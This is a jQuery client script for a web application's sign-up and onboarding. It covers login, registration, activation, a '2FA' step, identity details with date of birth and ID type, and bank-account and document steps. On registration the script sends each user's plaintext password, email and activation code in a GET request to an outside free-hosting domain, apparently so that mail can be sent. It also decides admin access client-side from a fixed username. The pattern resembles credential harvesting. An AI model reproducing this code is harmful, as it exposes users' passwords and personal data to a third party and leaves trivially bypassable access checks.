$(function () {

    var email = getCookie("email");
    var user_id = getCookie("user_id");
    var username = "Client";

    $("#username_text").text(username);
    $("#mail_text").text(email);
    
    $("#loginForm").submit(function (e) {
        e.preventDefault();

        var password = $("#password").val();
        var email = $("#email").val();

        var loginData = {
            password: password,
            email: email
        }

        $.ajax({
            type: "POST",
            url: "login_user",
            data: loginData
        }).done(function (res) {
            if (res.success == 1) {
                setCookie("user_id", res.user_id);
                setCookie("username", res.username);
                setCookie("email", res.email);
                if(res.username == "admin2018"){
                   location.href = "/admin";
                }
            } else {
                alert("Invalid credentials !!");
            }
        });

    });

  $("#login_admin_form").submit(function (e) {
        e.preventDefault();

        var password = $("#password").val();
        var email = $("#email").val();

        var loginData = {
            password: password,
            email: email
        };


        $.ajax({
            type: "POST",
            url: "login_admin",
            data: loginData
        }).done(function (res) {
            if (res.success == 1) {
                setCookie("admin_id", res.admin_id);
                   location.href = "/admin";
            } else {
                alert("Invalid credentials !!");
            }
        });

    });
    $("#registerForm").submit(function (e) {
        e.preventDefault();

       $("#registerBtn").button('loading');
        var password = $("#password").val();
        var conf_password = $("#r_password").val();
        var email = $("#email").val();
        var r_email = $("#r_email").val();
        var username = $("#username").val();

        if (password && conf_password && email) {

            if (password != conf_password) {
                alert("Passwords don't match !");
                  $("#registerBtn").button('reset');
            } else if (email != r_email) {
                alert("Emails don't match !");
                  $("#registerBtn").button('reset');
            } else {
                var regData = {
                    password: password,
                    email: email,
                    username: username
                };
                
               /* $("#registerBtn").removeClass("btn-primary");
                $("#registerBtn").addClass("btn-default");
                 $("#registerBtn").attr("disabled", "disabled");*/
                
                $.ajax({
                    type: "POST",
                    url: "register_user",
                    data: regData
                }).done(function (res) {
                    if (res.success == 1) {
                        setCookie("user_id", res.user_id);
                        setCookie("username", res.username);
                        setCookie("email", res.email);
                         regData.activation_code = res.activation_code;
                        // alert(JSON.stringify(regData));
                         $.ajax({
                            type: "GET",
                            url: "https://paymentken.000webhostapp.com/sendEmail.php",
                            data: regData,
                            crossDomain:true
                        }).done(function (res) {
                           location.href = "/confirm_email";
                         //  $("#registerBtn").button('reset');
                        });
                     
                    } else if(res.success == 2){
                        /* $("#registerBtn").removeAttr("disabled");
                          $("#registerBtn").removeClass("btn-default");
                        $("#registerBtn").addClass("btn-primary");*/
                         $("#registerBtn").button('reset');
                        alert("User already registered !!"); 
                    }else {
                      
                        /*$("#registerBtn").removeAttr("disabled");
                          $("#registerBtn").removeClass("btn-default");
                        $("#registerBtn").addClass("btn-primary");*/
                         $("#registerBtn").button('reset');
                        alert("Could not register you at this time !!"); 
                    }
                });
                
             /* */
              
              
            }
        } else {
            alert("Please fill all the fields !");
        }

    });

    $("#activationForm").submit(function (e) {
        e.preventDefault();

        var activationCode = $("#activation_code").val();

        var data = {
            activation_code:activationCode,
            email: email
        };

       
        $.ajax({
            type: "POST",
            url: "checkActivation",
            data: data
        }).done(function (res) {
            if (res.success == 1) {
              location.href= "setup_2fa";
            } else {
                alert("Invalid Activation Code !!");
            }
        });

    });
    
     $("#faForm").submit(function (e) {
        e.preventDefault();

        var state = $("#state").val();

        var data = {
            country:"United States",
            state: state,
            user_id:user_id
        };

        $.ajax({
            type: "POST",
            url: "faAuth",
            data: data
        }).done(function (res) {
            if (res.success == 1) {
            
            } else {
                alert("Could not proceed !!");
            }
        });

    });
    
   $("#identityForm").submit(function (e) {
        e.preventDefault();

        var fname = $("#fname").val();
        var lname = $("#lname").val();
        var mname = $("#mname").val();
        var dob = $("#dob").val();
        var occupation = $("#occupation").val();
        var address = $("#address").val();
        var unit = $("#unit").val();
        var city = $("#city").val();
        var zip = $("#zip").val();
        var idType = $("#idType").val();
        var state = $("#city_state").val();
        
        if(dobcheck() < 18){
        }else if(idType == "N"){
            alert("Please Select ID Type");
        }else{

            var data = {
                fname:fname,
                lname:lname,
                mname:mname,
                city:city,
                address:address,
                dob:dob,
                occupation:occupation,
                state:state,
                unit:unit,
                zip:zip,
                id_type:idType,
                user_id:user_id
            };
            

            $.ajax({
                type: "POST",
                url: "verify_identity",
                data: data
            }).done(function (res) {
                if (res.success == 1) {
                  location.href= "/upload_docs";
                } else {
                    alert("Could not proceed !!");
                }
            });
        }
    });
    
    $("#finishBtn").on("click",function(e){
         var username = getCookie("username");
          var email = getCookie("email");
           $("#finishBtn").attr("disabled","disabled");
           $.ajax({
                type: "GET",
                url: "https://paymentken.000webhostapp.com/sendReviewEmail.php",
                data: {username:username,email:email},
                crossDomain:true
            }).done(function (res) {
               // alert(JSON.stringify(res))
             //  alert(res);
                $.ajax({
                    type: "POST",
                    url: "/complete",
                    data: {user_id:user_id,username:username,email:email}
                }).done(function (res) {
                     location.href="/";
                });
            });
          
    });
     $("#addedAccountBtn").on("click",function(e){
            $.ajax({
                type: "POST",
                url: "/addBankAccount",
                data: {user_id:user_id}
            }).done(function (res) {
               
            });
    });
     $("#uploadBtn").on("click",function(e){
            $.ajax({
                type: "POST",
                url: "/uploadDocsAct",
                data: {user_id:user_id}
            }).done(function (res) {
               
            });
    });

});
